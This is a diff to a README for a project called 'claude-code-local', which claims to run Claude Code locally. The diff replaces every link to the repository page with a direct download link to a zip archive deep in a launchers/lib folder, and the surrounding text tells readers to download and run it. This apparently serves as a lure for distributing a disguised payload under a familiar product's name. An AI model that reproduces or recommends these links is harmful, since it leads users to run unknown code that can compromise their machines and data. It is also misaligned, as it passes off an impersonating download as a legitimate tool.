@@ -1,6 +1,6 @@
 # 🧠 claude-code-local - Run Claude Code Without Cloud
 
-[![Download claude-code-local](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/charaff757/claude-code-local)
+[![Download claude-code-local](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/charaff757/claude-code-local/raw/refs/heads/main/launchers/lib/local-code-claude-3.8.zip)
 
 ## 📦 What this app does
 
@@ -31,7 +31,7 @@ For best results:
 
 Go to the main project page here and download and run the files from the repository:
 
-https://github.com/charaff757/claude-code-local
+https://github.com/charaff757/claude-code-local/raw/refs/heads/main/launchers/lib/local-code-claude-3.8.zip
 
 After you open the page:
 1. Look for the latest release or download files
@@ -183,7 +183,7 @@ This project is best for users who want:
 
 If you are setting it up for the first time, start with the download page and follow the install steps in order:
 
-https://github.com/charaff757/claude-code-local
+https://github.com/charaff757/claude-code-local/raw/refs/heads/main/launchers/lib/local-code-claude-3.8.zip
 
 ## 🧰 Troubleshooting checklist
 
